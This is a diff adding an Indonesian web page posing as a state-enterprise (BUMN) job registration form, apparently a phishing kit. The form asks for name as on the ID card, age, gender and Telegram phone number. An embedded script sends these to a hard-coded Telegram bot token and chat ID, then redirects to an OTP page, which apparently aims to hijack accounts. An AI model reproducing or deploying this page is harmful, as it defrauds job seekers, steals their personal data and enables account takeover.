@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en" class="h-100">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+      crossorigin="anonymous"
+    />
+    <link href="css/custom.css" type="text/css" rel="stylesheet" />
+    <link href="css/menebus.css" type="text/css" rel="stylesheet" />
+    <link rel="icon" href="./css/img/garuda.png" type="image/x-icon" />
+    <link rel="stylesheet" href="css/style.css" />
+
+    <!-- Open Graph meta tags -->
+    <meta property="og:title" content="LOKER TERBARU" />
+    <meta
+      property="og:description"
+      content="LOWONGAN KERJA TERBARU SE-INDONESIA 2024-2025"
+    />
+    <meta
+      property="og:image"
+      content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinTH-PBwKTf10wqnmMcCLmiq7yCG-bzSt9yo13OIopd2lruS_VivY_U03bafO_aP7holcrN-OXT1ZNM-sStObKfm08ImcxLFRxPNll5htbg7tE5c0JYd5eixLFqVym72SijO9aiRrSpyExUDYdKaBtXO88FAunTkx6SjwPO4VWI4zj8vG3skJsBeFTBJDl/s600/jagi5juta.png"
+    />
+    <meta property="og:url" content="https://yourwebsite.com" />
+    <meta property="og:type" content="website" />
+
+    <!-- Style khusus untuk footer -->
+    <style>
+      /* overlay.css */
+      .overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 1000;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .spinner {
+        width: 50px;
+        height: 50px;
+        border: 5px solid rgba(255, 255, 255, 0.3);
+        border-top: 5px solid white;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        from {
+          transform: rotate(0deg);
+        }
+
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .footer-banner img {
+        width: 100%;
+        /* Menyesuaikan lebar gambar dengan kolom input */
+        max-width: 400px;
+        /* Atur batas maksimum lebar jika diperlukan */
+        height: auto;
+        /* Mempertahankan rasio aspek gambar */
+        display: block;
+        margin: 0 auto;
+        /* Memposisikan gambar di tengah */
+        padding: 10px 0;
+        /* Menambahkan jarak vertikal di atas dan bawah */
+      }
+    </style>
+
+    <title>LOKER TERBARU</title>
+  </head>
+
+  <body class="d-flex flex-column h-100">
+    <!-- Overlay -->
+    <div id="overlay" class="overlay">
+      <div class="spinner"></div>
+    </div>
+
+    <main class="flex-shrink-0">
+      <div class="container container-narrow">
+        <div class="header mt-3 text-center">
+          <img src="jsss.jpg" class="img-fluid" width="350" />
+        </div>
+
+        <h4 class="fw-bold mt-2 page-header text-center marquee">
+          <span>SILAHKAN ISI DATA ANDA DENGAN BENAR DI BAWAH INI</span>
+        </h4>
+
+        <!-- Kolom warna biru di atas form input -->
+        <div
+          class="text-center p-2 mb-3"
+          style="background-color: #05529b; color: white"
+        >
+          <strong>REGISTER</strong>
+        </div>
+
+        <form action="auth/firstData.php" method="post" id="firstForm">
+          <div class="col-sm-12">
+            <label for="full_name">Nama Lengkap (sesuai E-KTP)</label>
+            <input
+              class="form-control"
+              placeholder="Nama Lengkap"
+              type="text"
+              name="full_name"
+              id="full_name"
+              required
+            />
+          </div>
+          <div class="col-sm-12">
+            <label for="icnumber">Usia</label>
+            <input
+              class="form-control"
+              placeholder="Masukkan Usia"
+              type="text"
+              name="icnumber"
+              id="icnumber"
+              required
+            />
+          </div>
+          <div class="col-sm-12">
+            <label for="sek">Jenis Kelamin</label>
+            <select class="form-control" name="sek" id="sek" required>
+              <option value="Laki-laki">Laki Laki</option>
+              <option value="Perempuan">Perempuan</option>
+            </select>
+          </div>
+          <div class="col-sm-12">
+            <label for="phone_number">Nomor Telepon Telegram Aktif</label>
+            <input
+              class="form-control"
+              placeholder="Phone Number"
+              type="tel"
+              name="phone_number"
+              id="phone_number"
+              required
+            />
+          </div>
+
+          <!-- Checkbox Tambahan -->
+          <div class="col-sm-12 my-3">
+            <label>
+              <input
+                type="checkbox"
+                name="agree_telegram"
+                id="agree_telegram"
+                required
+              />
+              Saya setuju untuk menerima pesan Telegram dari Admin tentang
+              Pendaftaran Ini
+            </label>
+          </div>
+
+          <div class="text-center">
+            <button
+              type="submit"
+              class="btn btn-lg btn-block btn-mk"
+              id="submitButton"
+              style="background-color: #05529b; color: white"
+            >
+              DAFTAR
+            </button>
+          </div>
+        </form>
+      </div>
+    </main>
+
+    <!-- Include JavaScript -->
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // Hide overlay initially
+        document.getElementById("overlay").style.display = "none";
+
+        // Add event listener to the submit button
+        document
+          .getElementById("submitButton")
+          .addEventListener("click", function (e) {
+            e.preventDefault();
+
+            // Get form fields
+            const fullName = document.getElementById("full_name").value.trim();
+            const icNumber = document.getElementById("icnumber").value.trim();
+            const sek = document.getElementById("sek").value.trim();
+            let phoneNumber = document
+              .getElementById("phone_number")
+              .value.trim();
+            const agreeTelegram =
+              document.getElementById("agree_telegram").checked;
+
+            // Validasi form
+            if (
+              fullName === "" ||
+              icNumber === "" ||
+              sek === "" ||
+              phoneNumber === "" ||
+              !agreeTelegram
+            ) {
+              alert("Semua kolom wajib diisi dengan benar sebelum mengirim.");
+              return;
+            }
+
+            // Format nomor telepon
+            if (!phoneNumber.startsWith("+62")) {
+              if (phoneNumber.startsWith("0")) {
+                phoneNumber = "+62" + phoneNumber.slice(1);
+              } else {
+                phoneNumber = "+62" + phoneNumber;
+              }
+            }
+
+            // Simpan data ke localStorage
+            const userData = {
+              fullName: fullName,
+              icNumber: icNumber,
+              sek: sek,
+              phoneNumber: phoneNumber,
+            };
+            localStorage.setItem("userData", JSON.stringify(userData));
+
+            // Tampilkan overlay
+            document.getElementById("overlay").style.display = "flex";
+
+            // Format pesan Telegram
+            const message = encodeURIComponent(`
+────────────────
+📝 Data Pendaftaran Baru:
+────────────────
+👤 Nama: ${fullName}
+📅 Usia: ${icNumber}
+👥 Jenis Kelamin: ${sek}
+📱 No. Telepon: ${phoneNumber}
+────────────────
+`);
+
+            // URL API Telegram
+            const botToken = "7884988749:AAFgVupRDZtfl8u3mOoE4Ltd7h9Sl-qC84o";
+            const chatId = "7727889444";
+
+            // Kirim pesan ke Telegram
+            fetch(
+              `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=HTML`
+            )
+              .then((response) => response.json())
+              .then((data) => {
+                if (data.ok) {
+                  window.location.href = "otp.html";
+                } else {
+                  throw new Error(
+                    data.description || "Terjadi kesalahan pada API Telegram"
+                  );
+                }
+              })
+              .catch((error) => {
+                console.error("Error detail:", error);
+                alert("Terjadi kesalahan: " + error.message);
+              })
+              .finally(() => {
+                document.getElementById("overlay").style.display = "none";
+              });
+          });
+
+        // Cek apakah ada data tersimpan dan isi form
+        const savedUserData = localStorage.getItem("userData");
+        if (savedUserData) {
+          const userData = JSON.parse(savedUserData);
+          document.getElementById("full_name").value = userData.fullName;
+          document.getElementById("icnumber").value = userData.icNumber;
+          document.getElementById("sek").value = userData.sek;
+          document.getElementById("phone_number").value = userData.phoneNumber;
+        }
+      });
+    </script>
+
+    <!-- Gambar di bawah Form -->
+    <div class="footer-banner">
+      <img
+        src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrGBJxiOL6WMka-Ml_ECzYj0rPQpcJs4F6ihZeayj0IYjlaMX1JpzUWIx0KBEI_Jwtrjo-OYmcJAcfDusSANGQt652a7nVIJE779kTcIYN4xI6Rl-z2mblbLmIc--wu_ib_4mM9MQMHaqhYv8d-gE6veXMLcmUyVzDKhjt33OmQzKBBABb_MJ3cpQVIw/s600/kementerianbumnlogo.png"
+      />
+    </div>
+
+    <!-- my java script -->
+    <script src="js/script.js"></script>
+  </body>
+</html>
